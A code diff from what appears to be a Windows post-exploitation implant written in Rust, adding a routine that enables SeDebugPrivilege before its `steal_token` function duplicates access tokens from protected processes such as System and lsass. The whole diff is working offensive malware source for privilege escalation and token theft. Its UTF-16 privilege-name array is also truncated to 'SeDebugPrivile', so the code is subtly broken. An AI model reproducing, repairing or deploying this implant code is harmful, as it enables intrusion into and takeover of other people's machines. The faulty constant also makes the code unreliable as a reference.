@@ -50,6 +50,102 @@ fn force_load(dll: &[u8]) -> bool {
     !unsafe { load(name.as_ptr()) }.is_null()
 }
 
+/// Enable `SeDebugPrivilege` on the calling process's own token. Required
+/// before `OpenProcess`/`OpenProcessToken` can acquire token access against
+/// protected processes (e.g. the System process, PID 4) — even when the beacon
+/// runs as SYSTEM, the privilege is present-but-disabled in its token until
+/// explicitly enabled via `AdjustTokenPrivileges`. Idempotent + best-effort:
+/// returns false (not an error) if the privilege is absent (non-SYSTEM token),
+/// so callers can still attempt the operation and surface the real failure.
+///
+/// Uses `LookupPrivilegeValueW` + `AdjustTokenPrivileges` from advapi32 (the
+/// caller guarantees advapi32 is force-loaded). No-op-safe if any export is
+/// unresolvable.
+unsafe fn enable_debug_privilege() -> bool {
+    // LUID for SeDebugPrivilege.
+    #[repr(C)]
+    struct Luid {
+        low: u32,
+        high: i32,
+    }
+    // TOKEN_PRIVILEGES { PrivilegeCount: 1, Luid: Luid, Attributes: SE_PRIVILEGE_ENABLED }
+    #[repr(C)]
+    struct TokenPrivileges {
+        count: u32,
+        luid: Luid,
+        attributes: u32,
+    }
+    const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
+    const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
+    const TOKEN_QUERY: u32 = 0x0008;
+
+    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
+    type OpenProcessToken =
+        unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    type LookupPrivilegeValueW =
+        unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
+    type AdjustTokenPrivileges = unsafe extern "system" fn(
+        *mut c_void,      // TokenHandle
+        i32,              // DisableAllPrivileges
+        *const TokenPrivileges, // NewState (NULL ok)
+        u32,              // BufferLength
+        *mut c_void,      // PreviousState (NULL)
+        *mut u32,         // ReturnLength (NULL)
+    ) -> i32;
+    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
+
+    let gcp: GetCurrentProcess =
+        match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let opt: OpenProcessToken =
+        match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let lpv: LookupPrivilegeValueW =
+        match unsafe { export_addr(b"advapi32.dll", b"LookupPrivilegeValueW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let atp: AdjustTokenPrivileges =
+        match unsafe { export_addr(b"advapi32.dll", b"AdjustTokenPrivileges") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
+    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return false,
+    };
+
+    let mut luid = Luid { low: 0, high: 0 };
+    // SeDebugPrivilege (UTF-16, null-terminated).
+    let priv_name: [u16; 15] = [
+        b'S' as u16, b'e' as u16, b'D' as u16, b'e' as u16, b'b' as u16, b'u' as u16,
+        b'g' as u16, b'P' as u16, b'r' as u16, b'i' as u16, b'v' as u16, b'i' as u16,
+        b'l' as u16, b'e' as u16, 0,
+    ];
+    if unsafe { lpv(core::ptr::null(), priv_name.as_ptr(), &mut luid) } == 0 {
+        return false;
+    }
+    let hproc = unsafe { gcp() };
+    let mut htok: *mut c_void = core::ptr::null_mut();
+    if unsafe { opt(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htok) } == 0 {
+        return false;
+    }
+    let tp = TokenPrivileges {
+        count: 1,
+        luid,
+        attributes: SE_PRIVILEGE_ENABLED,
+    };
+    // AdjustTokenPrivileges returns 1 on success even if not all privs were
+    // adjusted; GetLastError (we don't call it) distinguishes. Best-effort.
+    let ok = unsafe { atp(htok, 0, &tp, 0, core::ptr::null_mut(), core::ptr::null_mut()) };
+    let _ = close(htok);
+    ok != 0
+}
+
 /// Steal the primary token of `pid` by opening that process with
 /// PROCESS_QUERY_LIMITED_INFORMATION, then OpenProcessToken + DuplicateTokenEx
 /// (impersonation level). Stores the duplicated handle process-wide; a prior
@@ -58,6 +154,10 @@ pub unsafe fn steal_token(pid: u32) -> Result<(), &'static str> {
     if !force_load(b"advapi32.dll") {
         return Err("steal_token: advapi32.dll load failed");
     }
+    // Enable SeDebugPrivilege BEFORE opening the target — protected processes
+    // (System pid 4, PPL, lsass) reject token access without it, even as SYSTEM.
+    let _ = unsafe { enable_debug_privilege() };
+
     type OpenProcess = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
     type OpenProcessToken =
         unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
